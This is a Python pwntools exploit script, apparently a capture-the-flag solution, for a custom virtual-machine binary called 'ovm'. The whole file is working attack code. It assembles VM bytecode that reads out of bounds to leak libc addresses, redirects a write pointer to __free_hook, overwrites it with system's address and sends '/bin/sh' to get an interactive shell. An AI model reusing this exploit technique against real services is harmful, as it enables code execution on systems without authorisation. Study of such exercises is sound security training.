#coding=utf-8
from pwn import *
local = 1
exec_file="./ovm"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *($text_base+0x0000000000000B60)
    b *($text_base+0x0000000000000D4B)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))

def Init(pc,SP,size,code):
    a.sendlineafter("PC: ",str(pc))
    a.sendlineafter("SP: ",str(SP))
    a.sendlineafter("CODE SIZE: ",str(size))
    a.recvuntil("CODE: ")
    a.send(code)
times = 0
def opcode(opcode,op1,op2,op3):
    global times
    s = (opcode<<24)+(op1<<16)+(op2<<8)+op3
    times+=1
    return str(s)+'\n'
def ADD(op1,op2,op3):#reg[op1] = reg[op2] + reg[op3];
    return opcode(0x70,op1,op2,op3)
def SUB(op1,op2,op3):
    return opcode(0x80,op1,op2,op3)
def PUSH(op1):
    return opcode(0x50,op1,0,0) # stack[SP] = reg[op1]
def POP(op1):
    return opcode(0x60,op1,0,0) # reg[op1] = Stack[SP]
def MOV_TO_REG(op1,op3):
    return opcode(0x30,op1,0,op3)# reg[op1] = mem[reg[op3]]
def MOV_TO_MEM(op1,op3):
    return opcode(0x40,op3,0,op1)# MEM[reg[op1]] = reg[op2]
def LSHIFT(op1,op2,op3):
    return opcode(0xC0,op1,op2,op3)
def RSHIFT(op1,op2,op3):
    return opcode(0xD0,op1,op2,op3)
def EXIT():
    return opcode(0xd1,0,0,0)

SP_index = 13
IP_index = 15 
offset_free_got = -62
__free_hook = libc.symbols["__free_hook"]
free = libc.symbols["free"]
offset = __free_hook - free
print hex(offset)
code=""
for i in range(61):
    code+=SUB(1,1,13)#reg[1]=-31
code+=MOV_TO_REG(0,1)#
code+=SUB(1,1,13)
code+=MOV_TO_REG(2,1)# reg[0] = 7fff reg[2] = F7A914F0
code+=ADD(3,3,15)#reg[3] = 1
for i in range(14):
    code+=LSHIFT(3,3,13)
code+=ADD(4,4,3)
code+=ADD(3,3,3)
code+=ADD(3,3,4)
code+=RSHIFT(4,4,13)
code+=RSHIFT(4,4,13)
code+=ADD(3,3,4)
for i in range(0xad48+8):
    code+=SUB(3,3,13)
code+=ADD(2,2,3)#reg[2]=free_hook&0xffffffff
for i in range(54):
    code+=ADD(1,1,13)
code+=MOV_TO_MEM(1,2)
code+=ADD(1,1,13)
code+=MOV_TO_MEM(1,0)
code+=EXIT()
Init(0,1,times,code)
a.recvuntil("R0: ")
a1 = a.recvuntil("\n",drop=True)
a.recvuntil("R2: ")
a2 = a.recvuntil("\n",drop=True)
libc_base=int(a1+a2,16)-libc.symbols["__free_hook"]+8
fuck(libc_base)
a.recvuntil("HOW DO YOU FEEL AT OVM?\n")
a.sendline("/bin/sh\x00"+p64(libc_base+libc.symbols["system"]))

a.interactive()









